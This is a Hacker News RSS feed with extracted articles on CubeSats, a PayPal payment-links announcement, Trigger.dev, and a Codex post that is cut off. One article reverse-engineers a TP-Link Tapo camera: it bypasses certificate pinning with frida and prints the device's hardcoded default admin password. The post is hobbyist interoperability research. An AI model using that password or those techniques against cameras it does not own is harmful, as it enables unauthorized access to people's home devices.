<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-09-16T13:01:39.586084+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45249878</id><title>CubeSats are fascinating learning tools for space</title><updated>2025-09-16T13:01:51.560664+00:00</updated><content>&lt;doc fingerprint="b535155168e585d4"&gt;
  &lt;main&gt;
    &lt;p&gt;These are CubeSats. Satellites that are going to space—or at least, the ones I have here are prototypes. But these have one thing in common: they're all powered by either a Raspberry Pi, or a microcontroller.&lt;/p&gt;
    &lt;p&gt;There are already Pis in space, like on Mark Rober's SatGus, on GASPACS, and the Astro Pis on the Space station. Another Pi is going up this weekend, which is why I'm posting this today. I'll get to that one, but I wanted to spend some time talking about two things that fascinate me: Raspberry Pis, and putting them space!&lt;/p&gt;
    &lt;p&gt;In this post, I'll cover:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;What is a CubeSat&lt;/item&gt;
      &lt;item&gt;Who builds and launches CubeSats&lt;/item&gt;
      &lt;item&gt;How you can build your own CubeSat&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Then for a bonus, in today's video, I interviewed two people helping students launch SilverSat into space (this weekend!), and a YouTuber who I've learned a lot from about track satellites (including CubeSats) from your own backyard!&lt;/p&gt;
    &lt;p&gt;The rest of this post contains a lightly-edited transcript of the video above.&lt;/p&gt;
    &lt;p&gt;So let's dive in.&lt;/p&gt;
    &lt;head rend="h2"&gt;What's a CubeSat?&lt;/head&gt;
    &lt;p&gt;What's a CubeSat? Well, it's in the name—it's a satellite that's a cube!&lt;/p&gt;
    &lt;p&gt;But they don't have to be a cube, these smallest ones are '1U', or 10 x 10 x 10 centimeters. You can also find 2U CubeSats, like the taller Build a CubeSat, which is 20 centimeters tall. (Well, technically the current prototype is 1.5U).&lt;/p&gt;
    &lt;p&gt;SatGus, Mark Rober's satellite taking space selfies, is a whopping 12U! They needed all that extra space to fit a phone, a mechanism to deploy the phone, a camera to take the selfie, a Raspberry Pi to control the phone, and redundant systems for everything. They've already taken thousands of selfies, and SatGus has me beat. My best Pi might get to 3.4 Gigahertz, but the Pi on SatGus is whizzing through space at almost 17,000 miles per hour. That's 7,570 meters per second for everyone else in the world.&lt;/p&gt;
    &lt;p&gt;But back to CubeSats. Having standards means you can build off existing work for the hard things, like a space-rated Aluminum frame, or the complex EPS, or Electrical Power System board.&lt;/p&gt;
    &lt;p&gt;Then you can add in custom parts, like a Pi to run experiments, a communications board with antennas and radios, cameras, sensors, and more!&lt;/p&gt;
    &lt;p&gt;And these cubesats have normal screw-on antennas, but the way these things are deployed, you only get 10x10x10 centimeters—you can't have an antenna poking out the top. So they use cool things like flexible tape antennas that pop out once your CubeSat deploys.&lt;/p&gt;
    &lt;p&gt;What else makes CubeSats cool?&lt;/p&gt;
    &lt;p&gt;Well, how about price? In the old days, you had to have like $10 million to build a satellite, and $60+ million to launch it into space.&lt;/p&gt;
    &lt;p&gt;Today, you can build a space-ready CubeSat using a few thousand dollars of parts. Then you can launch it on a rideshare for... well, $85 grand. Which is a lot, but it's not $60 million-a-lot.&lt;/p&gt;
    &lt;p&gt;So most of us won't be launching one of these things into space, unless maybe you can get a grant. But that doesn't mean they're not useful to us.&lt;/p&gt;
    &lt;head rend="h2"&gt;Who builds CubeSats?&lt;/head&gt;
    &lt;p&gt;Like with many projects, I love these things for the challenge, the way they break some of my assumptions, like working with Raspberry Pis.&lt;/p&gt;
    &lt;p&gt;If you're building a device that's less than 2 kilograms, has 1.8W of maximum continuous power draw, and needs to be operated remotely—even for just a month—you're immediately going to change your assumptions about how you build things.&lt;/p&gt;
    &lt;p&gt;I would hack Home Assistant onto a mini PC to monitor some sensors if I was feeling lazy—but that Mini PC would use an order of magnitude too much power for a CubeSat (much less the internal volume it would occupy).&lt;/p&gt;
    &lt;p&gt;On CubeSats, every millimeter, and every milliAmp has to be accounted for.&lt;/p&gt;
    &lt;p&gt;So to me, CubeSats are like Swiss watches of modern electronics. How many sensors can you fit in one? How much throughput can you get on a tiny radio with a small antenna? Can you get enough power out of tiny solar cells to keep the main flight computer working? How do you control thermals without air? How do you design it so it can recover from a complete power loss?&lt;/p&gt;
    &lt;p&gt;Every step of the way there are challenges; and that's before we even launch one! Someone who I think illustrates this best is Manuel, with his Build a CubeSat project. He's working on this Cubesat:&lt;/p&gt;
    &lt;p&gt;He did a weather balloon launch this year, and he's documenting everything on YouTube.&lt;/p&gt;
    &lt;p&gt;His first launch had many small problems. But also great learning, especially around redundancy and how to get the thing off the launch stand without problems.&lt;/p&gt;
    &lt;p&gt;And you're not only dealing with hardware, but also with software. And software that, at its core, has to be remotely accessed. And not only remote, but also wireless, meaning anyone else on earth within range can access it too.&lt;/p&gt;
    &lt;p&gt;So how do you keep it secure? That's something Tim from Ethos Labs is also dealing with with this, his T.E.M.P.E.S.T. CubeSat:&lt;/p&gt;
    &lt;p&gt;This thing is actually made to be not secure. It has intentional vulnerabilities, and he uses those to teach people different ways to make their CubeSats more secure.&lt;/p&gt;
    &lt;p&gt;You have complex hardware, running in limited space, with limited power and communications, and you want cram in as much functionality as possible.&lt;/p&gt;
    &lt;p&gt;Do you see where I'm going with this? That kind of problem is perfect for the microcontrollers and low-power SBCs that I love testing and playing with every day.&lt;/p&gt;
    &lt;p&gt;Except instead of me worrying about something consuming 10 watts, these guys are looking at a power budget of one watt. Or less!&lt;/p&gt;
    &lt;p&gt;These problems are hard. And not everyone has the patience for a completely custom project like Build a CubeSat, so there are also some small companies building kits to help you learn all these lessons with a little less stress.&lt;/p&gt;
    &lt;p&gt;Like what hardware do you need for a 100% self-contained CubeSat? And how do you get it certified for flight on a SpaceX rocket?&lt;/p&gt;
    &lt;head rend="h2"&gt;Your own CubeSat&lt;/head&gt;
    &lt;p&gt;Well, I'll quickly cover two products that are meant for like STEM classroom education, one from the lower end, and one that's based on a CubeSat that just flew this summer.&lt;/p&gt;
    &lt;p&gt;The first one is the MySat Kit, that you can buy from MySat in Ukraine. It comes with a board powered by an ESP32 with a camera, light sensors, an LED, gyroscope, accelerometer, barometer, clock, and a few other boards. And these are all off-the-shelf components you can buy replacements for or use 'em with other hardware, like a Raspberry Pi.&lt;/p&gt;
    &lt;p&gt;The way it's put together won't hold up on a rocket launch, but it's not meant for that. It's meant to show you how it's built, how you can communicate with it, and that sort of thing.&lt;/p&gt;
    &lt;p&gt;It took like an hour to build, and once I put it together I tried flashing the flight control firmware with my Mac... but I ran into some issues with Arduino IDE, and that's a me problem and not so much a MySat problem. Plus the team behind it has a whole war going on that they've been dealing with, so I'll be patient and try getting it going later.&lt;/p&gt;
    &lt;p&gt;The MySat goes from like $130 for a basic kit where you 3D print your own frame, or up to $300 for a full kit including deployable solar panels.&lt;/p&gt;
    &lt;p&gt;On the higher end, there's RASCube, and Edward Robinson, the 21 year old founder of Robinson Space, sent it over after he saw me posting about CubeSats online.&lt;/p&gt;
    &lt;p&gt;The RASCube comes from Australia, and Edward's mission is to teach students about space through hands-on building.&lt;/p&gt;
    &lt;p&gt;I just built this LS version of the cube last week; it's the little brother to their V2 design, which flew in space on a Falcon 9 rocket earlier this year.&lt;/p&gt;
    &lt;p&gt;Like MySat, you build the kit with an EPS board for power, a computer board with all the controls, and a radio board that ties in GPS and radio comms.&lt;/p&gt;
    &lt;p&gt;The RASCubes are a bit more expensive, coming in at around $430 each for the LB, and $600 each for the full aluminum V2s. But the price tag on that also covers full lesson plans and resources for teachers.&lt;/p&gt;
    &lt;p&gt;I love these things—all the people I've talked to on this journey are motivated by the same thing: learning about space, electronics, and integrating hardware in a new way, and sharing what they learn with others, especially students.&lt;/p&gt;
    &lt;head rend="h2"&gt;CubeSat T.E.M.P.E.S.T. and Build a CubeSat&lt;/head&gt;
    &lt;p&gt;Like take Build a Cubesat. For that project, everything is open source hardware, and every part of the journey is being documented on YouTube.&lt;/p&gt;
    &lt;p&gt;One thing I learned from the first flight test was how weird it is to have your Pi go from like overheating on the ground, to getting really cold as it goes higher, but then overheating again in the upper atmosphere because there's not enough air to dissipate heat!&lt;/p&gt;
    &lt;p&gt;You start to realize some of the crazy physical conditions you'll deal with on orbit.&lt;/p&gt;
    &lt;p&gt;Back down to earth, though, for CubeSat Tempest: the whole reason this exists is to help people learn why security is important, even for a tiny CubeSat. More importantly, Tim Fowler's course teaches people how to secure things like uplinks (see: the ground station pictured above) and flight control systems.&lt;/p&gt;
    &lt;p&gt;There are so many people like Tim, who work in their free time to try to teach about space, or engineering, or just small slices of things like security, using these tactile little cubes you can build and put next to your laptop on a desk.&lt;/p&gt;
    &lt;p&gt;It's crazy to think we're to a point where students can build these things, write flight control software, and even launch 'em into space!&lt;/p&gt;
    &lt;p&gt;And that brings me to SilverSat.&lt;/p&gt;
    &lt;head rend="h2"&gt;SilverSat&lt;/head&gt;
    &lt;p&gt;There's another CubeSat with a Raspberry Pi onboard, and it's launching NET Sunday, at 6:11 p.m. Eastern time, aboard a Falcon 9 rocket. What does NET mean? Well, as I found out when I visited Florida this summer, that means "No Earlier Than", and in spaceflight, many things delay launches.&lt;/p&gt;
    &lt;p&gt;The students who built SilverSat are no strangers to delays—they were originally supposed to see their CubeSat launch earlier this year, but the cargo module they were on got damaged during transport, and that delayed them for months.&lt;/p&gt;
    &lt;p&gt;I got to talk to two of the adults guiding the students on their first space launch, and I discussed the history of the project (it started up in 2017), how they are supported by NASA's CubeSat Launch Initiative, the importance of amateur radio for CubeSats, and why they chose a Raspberry Pi Zero for their onboard computer.&lt;/p&gt;
    &lt;p&gt;That interview is tucked away in the last half of the video at the top of this post.&lt;/p&gt;
    &lt;head rend="h2"&gt;Tracking Satellites from your backyard&lt;/head&gt;
    &lt;p&gt;Also in that video, I spoke to Gabe from saveitforparts, and he mentioned it's not that difficult to listen in on satellites on orbit—including amateur CubeSats!&lt;/p&gt;
    &lt;p&gt;SilverSat will be broadcasting SSDV (Slow-Scan Digital Video) at set times, and the schedule for that should be posted on their website.&lt;/p&gt;
    &lt;p&gt;Check out the video embedded in this post (near the top), or Gabe's own channel for ideas for tracking satellites. It can be done with under $100 of equipment (usually just an SDR and a cheap antenna).&lt;/p&gt;
    &lt;head rend="h2"&gt;Infectious Enthusiasm for Learning (and Teaching)&lt;/head&gt;
    &lt;p&gt;I feel like a broken record, but one thing I love, talking to anyone in the CubeSat community is this sense of infectious enthusiasm. And I was going to cut this video out for time, but watching it back, I realized other people would probably enjoy Tim showing off some neat CubeSats in his personal collection as much as I did. So I put up some bonus content on my second channel, Level 2 Jeff; you can watch another 8 minutes of CubeSat hardware below:&lt;/p&gt;
    &lt;p&gt;Thank you to everyone who taught me about CubeSats for this video and blog post.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.jeffgeerling.com/blog/2025/cubesats-are-fascinating-learning-tools-space"/><published>2025-09-15T14:02:02+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45249915</id><title>PayPal to support Ethereum and Bitcoin</title><updated>2025-09-16T13:01:51.233404+00:00</updated><content>&lt;doc fingerprint="bc09acb02f2e3d8"&gt;
  &lt;main&gt;
    &lt;p&gt;PayPal Ushers in a New Era of Peer-to-Peer Payments, Reimagining How Money Moves to Anyone, Anywhere&lt;/p&gt;
    &lt;p&gt;Send and receive money as easily as sending a text, across apps, borders, and currencies &lt;/p&gt;
    &lt;div&gt;
      &lt;p&gt;SAN JOSE, Calif., Sept. 15, 2025 /PRNewswire/ -- On the heels of the PayPal World announcement, a global platform connecting the world's largest digital payment systems and wallets, PayPal today introduced PayPal links, a new way to send and receive money through a personalized, one-time link that can be shared in any conversation.&lt;/p&gt;
      &lt;p&gt;&lt;lb/&gt; Creating personalized payment links | Click to Enlarge&lt;/p&gt;
      &lt;p&gt;PayPal users in the U.S. can begin creating personalized payment links today, with international expansion to the UK, Italy, and other markets starting later this month. By making payments this simple and universal, PayPal links helps drive new customer acquisition and brings more users into the PayPal ecosystem.&lt;/p&gt;
      &lt;p&gt;The peer-to-peer (P2P) experience is about to go even further. Crypto will soon be directly integrated into PayPal's new P2P payment flow in the app. This will make it more convenient for PayPal users in the U.S. to send Bitcoin, Ethereum, PYUSD, and more, to PayPal, Venmo, as well a rapidly growing number of digital wallets across the world that support crypto and stablecoins.&lt;/p&gt;
      &lt;p&gt;Expanding what people can do with PayPal also comes with reassurance around how personal payments are handled. As always, friends-and-family transfers through Venmo and PayPal are exempt from 1099-K reporting. Users won't receive tax forms for gifts, reimbursements, or splitting expenses, helping ensure that personal payments stay personal.&lt;/p&gt;
      &lt;p&gt;"For 25 years, PayPal has revolutionized how money moves between people. Now, we're taking the next major step," said Diego Scotti, General Manager, Consumer Group at PayPal. "Whether you're texting, messaging, or emailing, now your money follows your conversations. Combined with PayPal World, it's an unbeatable value proposition, showing up where people connect, making it effortless to pay your friends and family, no matter where they are or what app they're using."&lt;/p&gt;
      &lt;p&gt;P2P is a cornerstone of PayPal's consumer experience, driving engagement and bringing more users into the ecosystem. P2P and other consumer total payment volume saw solid growth in the second quarter, increasing 10% year-over-year as the company focused on improving the experience and increasing user discoverability to make it easier than ever to move money globally. Plus, Venmo saw its highest TPV growth in three years. With PayPal World unlocking seamless interoperability, P2P is poised for even greater momentum in the future as PayPal and Venmo connect to billions of wallets worldwide.&lt;/p&gt;
      &lt;p&gt;How PayPal links work:&lt;/p&gt;
      &lt;list type="disc" rend="ul"&gt;
        &lt;item&gt;Create a personalized link – Open the PayPal app, enter the details of your payment or request, and generate a unique, one-time link to share.&lt;/item&gt;
        &lt;item&gt;Always the right person – Each link is private, one-time use, and created for a specific transaction.&lt;/item&gt;
        &lt;item&gt;Drop it anywhere – Send your link in a text, DM, email, or chat. Add a note, emoji, or payment note.&lt;/item&gt;
        &lt;item&gt;Manage payment activity: Unclaimed links expire after 10 days. Users can send a reminder or even cancel the payment or request before the link is claimed with the PayPal app.&lt;/item&gt;
        &lt;item&gt;Tap and done – The recipient taps the link and either completes or accepts the payment within the PayPal App with their PayPal account.&lt;/item&gt;
        &lt;item&gt;Funds are instant – the recipient will get immediate access to their funds with a PayPal Balance account once accepted.&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;About PayPal&lt;lb/&gt; PayPal has been revolutionizing commerce globally for more than 25 years. Creating innovative experiences that make moving money, selling, and shopping simple, personalized, and secure, PayPal empowers consumers and businesses in approximately 200 markets to join and thrive in the global economy. For more information, visit https://www.paypal.com, https://about.pypl.com/ and https://investor.pypl.com/.&lt;/p&gt;
      &lt;p&gt;About PayPal USD (PYUSD) &lt;lb/&gt; PayPal USD is issued by Paxos Trust Company, LLC, a fully chartered limited purpose trust company. Paxos is licensed to engage in Virtual Currency Business Activity by the New York State Department of Financial Services. Reserves for PayPal USD are fully backed by U.S. dollar deposits, U.S. Treasuries and similar cash equivalents, and PayPal USD can be bought or sold through PayPal and Venmo at a rate of $1.00 per PayPal USD. &lt;lb/&gt; PayPal, Inc. (NMLS ID #: 910457) is licensed to engage in Virtual Currency Business Activity by the New York State Department of Financial Services. &lt;/p&gt;
      &lt;p&gt;Media contact&lt;lb/&gt; Gideon Anstey&lt;lb/&gt; gbanstey@paypal.com&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://newsroom.paypal-corp.com/2025-09-15-PayPal-Ushers-in-a-New-Era-of-Peer-to-Peer-Payments,-Reimagining-How-Money-Moves-to-Anyone,-Anywhere"/><published>2025-09-15T14:04:47+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45250720</id><title>Launch HN: Trigger.dev (YC W23) – Open-source platform to build reliable AI apps</title><updated>2025-09-16T13:01:50.929003+00:00</updated><content>&lt;doc fingerprint="bf77954a6d078e42"&gt;
  &lt;main&gt;
    &lt;div&gt;&lt;p&gt;Hi HN, I’m Eric, CTO at Trigger.dev (&lt;/p&gt;https://trigger.dev&lt;p&gt;). We’re a developer platform for building and running AI agents and workflows, open-source under the Apache 2.0 license (&lt;/p&gt;https://github.com/triggerdotdev/trigger.dev&lt;p&gt;).&lt;/p&gt;&lt;p&gt;We provide everything needed to create production-grade agents in your codebase and deploy, run, monitor, and debug them. You can use just our primitives or combine with tools like Mastra, LangChain and Vercel AI SDK. You can self-host or use our cloud, where we take care of scaling for you. Here’s a quick demo: (https://youtu.be/kFCzKE89LD8).&lt;/p&gt;&lt;p&gt;We started in 2023 as a way to reliably run async background jobs/workflows in TypeScript (https://news.ycombinator.com/item?id=34610686). Initially we didn’t deploy your code, we just orchestrated it. But we found that most developers struggled to write reliable code with implicit determinism, found breaking their work into small “steps” tricky, and they wanted to install any system packages they needed. Serverless timeouts made this even more painful.&lt;/p&gt;&lt;p&gt;We also wanted to allow you to wait for things to happen: on external events, other tasks finishing, or just time passing. Those waits can take minutes, hours, or forever in the case of events, so you can’t just keep a server running.&lt;/p&gt;&lt;p&gt;The solution was to build and operate our own serverless cloud infrastructure. The key breakthrough that enabled this was realizing we could snapshot the CPU and memory state. This allowed us to pause running code, store the snapshot, then restore it later on a different physical server. We currently use Checkpoint Restore In Userspace (CRIU) which Google has been using at scale inside Borg since 2018.&lt;/p&gt;&lt;p&gt;Since then, our adoption has really taken off especially because of AI agents/workflows. This has opened up a ton of new use cases like compute-heavy tasks such as generating videos using AI (Icon.com), real-time computer use (Scrapybara), AI enrichment pipelines (Pallet, Centralize), and vibe coding tools (Hero UI, Magic Patterns, Capy.ai).&lt;/p&gt;&lt;p&gt;You can get started with Trigger.dev cloud (https://cloud.trigger.dev), self-hosting (https://trigger.dev/docs/self-hosting/overview), or read the docs (https://trigger.dev/docs).&lt;/p&gt;&lt;p&gt;Here’s a sneak peek at some upcoming changes: 1) warm starts for self-hosting 2) switching to MicroVMs for execution – this will be open source, self-hostable, and will include checkpoint/restoring.&lt;/p&gt;&lt;p&gt;We’re excited to be sharing this with HN and are open to all feedback!&lt;/p&gt;&lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=45250720"/><published>2025-09-15T15:20:18+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45251690</id><title>Wanted to spy on my dog, ended up spying on TP-Link</title><updated>2025-09-16T13:01:49.255006+00:00</updated><content>&lt;doc fingerprint="b430811b1b0232ef"&gt;
  &lt;main&gt;
    &lt;p&gt;I recently bought a cheap Tapo indoor camera to see what my dog gets up to when I am out of the house.&lt;/p&gt;
    &lt;p&gt;What actually followed? I ended up reverse-engineering onboarding flows, decompiling an APK, MITMing TLS sessions, and writing cryptographic scripts.&lt;/p&gt;
    &lt;p&gt;My main motivation for this project really stemmed from the fact that the camera annoyed me from day one. Setting the camera up in frigate was quite painful, no one really seemed to know how these cameras worked online.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;SIDENOTE: If you want 2 way audio to work in frigate you must use the&lt;/p&gt;&lt;code&gt;tapo://&lt;/code&gt;go2rtc configuration for your main stream instead of the usual&lt;code&gt;rtsp://&lt;/code&gt;. TP-Link are lazy and only implement 2 way audio on their own proprietary API.&lt;/quote&gt;
    &lt;p&gt;One undocumented behavior that tripped me up was that the device’s API is supposed to accept credentials &lt;code&gt;admin&lt;/code&gt;:&lt;code&gt;&amp;lt;your-tapo-cloud-password&amp;gt;&lt;/code&gt; after onboarding. However after banging my head against a wall for a few hours I later discovered that if you change your cloud password after onboarding, paired devices don’t get the memo ð.&lt;/p&gt;
    &lt;p&gt;This implied a few things to me that started the cogs turning:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There must be a call made during on-boarding that syncs the device password with the cloud password&lt;/item&gt;
      &lt;item&gt;The device must either allow unauthenticated calls before this step or have some sort of default password.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So considering my onboarding woes and the fact that I was starting to recoil every time the tapo app tried to jam a “Tapo Care” subscription down my throat, a cloudless onboarding solution for the device was beginning to look more and more desirable.&lt;/p&gt;
    &lt;p&gt;The first step to cracking this egg was to be be able to snoop on what the app and the camera are saying to each other during onboarding. E.g, establish a man in the middle.&lt;/p&gt;
    &lt;head rend="h2"&gt;Man in the middle&lt;/head&gt;
    &lt;p&gt;To man in the middle a phone app, you must be able to route all http(s) traffic via a proxy server you control. Historically this has been quite simple to achieve, simply spin up a proxy on a computer, add the proxy’s self-signed certificate to the phone’s truststore, and configure the phone to point at the proxy.&lt;/p&gt;
    &lt;p&gt;However, modern phone apps can use a few nasty tricks to render this approach ineffective. Namely they will blatantly ignore proxies, throw the system truststore to the wind and make liberal use of certificate pinning.&lt;/p&gt;
    &lt;p&gt;The most full-proof technique for generically MITMing an app has therefore become dynamic instrumentation via tools like &lt;code&gt;frida&lt;/code&gt;. What this allows us to do is force an app to use the proxies and certificates that we tell it to whilst batting aside it’s attempts to do things like certificate pinning.&lt;/p&gt;
    &lt;p&gt;So the setup ended up looking like this (full setup guide here ):&lt;/p&gt;
    &lt;quote&gt;--- config: theme: 'base' themeVariables: primaryColor: '#00000000' primaryTextColor: '#fff' primaryBorderColor: '#ffffff8e' lineColor: '#fff' secondaryColor: '#fff' tertiaryColor: '#fff' --- sequenceDiagram participant A as Tapo App &amp;lt;br&amp;gt;(with frida hooks) participant L as Laptop &amp;lt;br&amp;gt;(mitmproxy) participant C as Tapo Camera A-&amp;gt;&amp;gt;L: Request L-&amp;gt;&amp;gt;L: Record request L-&amp;gt;&amp;gt;C: Forward request C--&amp;gt;&amp;gt;L: Response L-&amp;gt;&amp;gt;L: Record response L--&amp;gt;&amp;gt;A: Forward response&lt;/quote&gt;
    &lt;p&gt;After spinning up &lt;code&gt;mitmproxy&lt;/code&gt;, injecting the frida scripts
, and onboarding the camera, we finally see an initial login flow â before the admin password ever gets changed:&lt;/p&gt;
    &lt;p&gt;However, subsequent requests look like this:&lt;/p&gt;
    &lt;code&gt;{
  "method": "securePassthrough",
  "params": {
    "request": "bAhdgihJ9j6PrrknnbXWATBohGTZK5llv3MEzRcmoAmcxexmlVNz3OUX2r0h9a9EG/3X0tBpPi654T2+BjqVEOn2D178kokBpf8RQj01AvBZLYD5S5sFeaCXWiRXA7MgQUppROV4AbrU4f+GOM37KgPqT59qgLVja2slw6CzrKjPzOrG4Ho6Mu6wBa1xepcj"
  }
}
&lt;/code&gt;
    &lt;p&gt;And responses look like this:&lt;/p&gt;
    &lt;code&gt;{
  "seq": 584,
  "result": {
    "response": "Gqz1wbXAig/3wL+kXzY2Ig3hq+JSYasYI7FXdMNZR5PyH8bpLX+GJqQbImUtby9IEj5HQDhxqcTa+dUqQjI0GaGCxuGHqmrgQ0FeyCTQjBiW5gslAPQG33wj44OOkAep"
  },
  "error_code": 0
}
&lt;/code&gt;
    &lt;p&gt;So from this initial dive we have learned that:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Tapo 100% has a default password due to the fact that it performs a full login before it knows anything about the cloud password.&lt;/item&gt;
      &lt;item&gt;Tapo has an encrypted &lt;code&gt;securePassthrough&lt;/code&gt;channel for its API calls to prevent peeping toms such as myself from spilling the beans.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;The JADX dive&lt;/head&gt;
    &lt;p&gt;The next logical step is to decompile the apk in JADX and start rummaging around for a default password.&lt;/p&gt;
    &lt;p&gt;The initial login call that we captured references an &lt;code&gt;admin&lt;/code&gt; username:&lt;/p&gt;
    &lt;code&gt;{
  "method": "login",
  "params": {
    "cnonce": "AD0E189F6E1BA335",
    "encrypt_type": "3",
    "username": "admin"
  }
}
&lt;/code&gt;
    &lt;p&gt;Searching for &lt;code&gt;"admin"&lt;/code&gt; in JADX gives us many hits but there are a few concentrated in a &lt;code&gt;CameraOnboardingViewModel&lt;/code&gt; class that look interesting:&lt;/p&gt;
    &lt;p&gt;The function &lt;code&gt;m98131y2&lt;/code&gt; appears to be returning a password that is then passed to the &lt;code&gt;new Account()&lt;/code&gt; call. Following this function up the chain, we hit gold:&lt;/p&gt;
    &lt;p&gt;We already know that the device is using &lt;code&gt;encrypt_type: 3&lt;/code&gt;, so that means our default password is:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;TPL075526460603&lt;/code&gt;
    &lt;/p&gt;
    &lt;head rend="h2"&gt;Teaching mitmproxy new tricks&lt;/head&gt;
    &lt;p&gt;With the default password now revealed, we have the cards in our hand to derive session keys and decode the &lt;code&gt;securePassthrough&lt;/code&gt; messages.&lt;/p&gt;
    &lt;p&gt;The only thing that would help us further is if we had a reference implementation for the authentication flow. This is where PyTapo really came in handy.&lt;/p&gt;
    &lt;p&gt;Using PyTapo as a reference, we could dump the session state and encrypted messages from mitmproxy and write a script to do some static analysis on the decrypted requests and responses, but a really cool feature of &lt;code&gt;mitmproxy&lt;/code&gt; is that it supports scripting itself.&lt;/p&gt;
    &lt;p&gt;What this means is that we can pass a python script to mitmproxy, and have it directly decrypt request and response payloads inline whilst running a capture.&lt;/p&gt;
    &lt;p&gt;So I wrote &lt;code&gt;tapo_decrypt_pretty.py&lt;/code&gt; which:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Watches for the login handshake (&lt;code&gt;cnonce&lt;/code&gt;,&lt;code&gt;nonce&lt;/code&gt;,&lt;code&gt;device_confirm&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Derives &lt;code&gt;lsk&lt;/code&gt;/&lt;code&gt;ivb&lt;/code&gt;session keys from it&lt;/item&gt;
      &lt;item&gt;Transparently decrypts subsequent API calls&lt;/item&gt;
      &lt;item&gt;Pretty-prints them inline in mitmproxyâs UI in &lt;code&gt;request_decrypted&lt;/code&gt;and&lt;code&gt;response_decrypted&lt;/code&gt;fields&lt;/item&gt;
      &lt;item&gt;Dumps them to JSON files for later analysis&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Analysing the results&lt;/head&gt;
    &lt;p&gt;The complete list of calls made by the Tapo app during onboarding were:&lt;/p&gt;
    &lt;code&gt;getAppComponentList
setLanguage
scanApList
bindToCloud
changeAdminPassword
setTimezone
setRecordPlan
setDeviceLocation
connectAp
getConnectStatus
setAccountEnabled
changeThirdAccount
&lt;/code&gt;
    &lt;p&gt;This boiled down to just four important calls:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;scanApList&lt;/code&gt;â list Wi-Fi access points&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;setAccountEnabled&lt;/code&gt;+&lt;code&gt;changeThirdAccount&lt;/code&gt;â enable RTSP/ONVIF account&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;changeAdminPassword&lt;/code&gt;â change from default password to the cloud password&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;connectAp&lt;/code&gt;â join the selected Wi-Fi access point&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Everything else was fluff: timezones, record plans, binding to cloud.&lt;/p&gt;
    &lt;head rend="h2"&gt;Final thoughts&lt;/head&gt;
    &lt;p&gt;In the end, the prize for all this nonsense was a scrappy little Bash script, &lt;code&gt;tapo_onboard.sh&lt;/code&gt;
, which:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Logs in with the default admin password,&lt;/item&gt;
      &lt;item&gt;Scans and selects a Wifi access point&lt;/item&gt;
      &lt;item&gt;Switches off the obnoxious OSD logo on the camera feed,&lt;/item&gt;
      &lt;item&gt;Enables RTSP/ONVIF capabilities&lt;/item&gt;
      &lt;item&gt;Changes the admin password,&lt;/item&gt;
      &lt;item&gt;And finally joins the Wi-Fi.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Peeling this onion left me with a few observations on Tapoâs firmware.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Some endpoints use SHA-256 for hashing, while others cling to MD5 like itâs 2003.&lt;/item&gt;
      &lt;item&gt;There are two public keys used to send passwords to the device â one that is shared with the client and another super secret one that’s hardcoded in the app. The easiest way to figure out which one to use is to flip a coin.&lt;/item&gt;
      &lt;item&gt;Password syncing between the app and its managed devices is strictly vibe-based.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The whole thing feels like it was cobbled together by a consortium of couch-cryptographers. But then again, it was the cheapest indoor camera on amazon, so what did I expect?&lt;/p&gt;
    &lt;p&gt;And with all this said I did finally manage to figure out what the dog does when I am away.&lt;/p&gt;
    &lt;p&gt;She sleeps. On the sofa. Sometimes even in her bed.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://kennedn.com/blog/posts/tapo/"/><published>2025-09-15T16:28:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45252301</id><title>GPT-5-Codex</title><updated>2025-09-16T13:01:48.528013+00:00</updated><content>&lt;doc fingerprint="ba44655ec680c89c"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing upgrades to Codex&lt;/head&gt;
    &lt;p&gt;Codex just got faster, more reliable, and better at real-time collaboration and tackling tasks independently anywhere you develop—whether via the terminal, IDE, web, or even your phone.&lt;/p&gt;
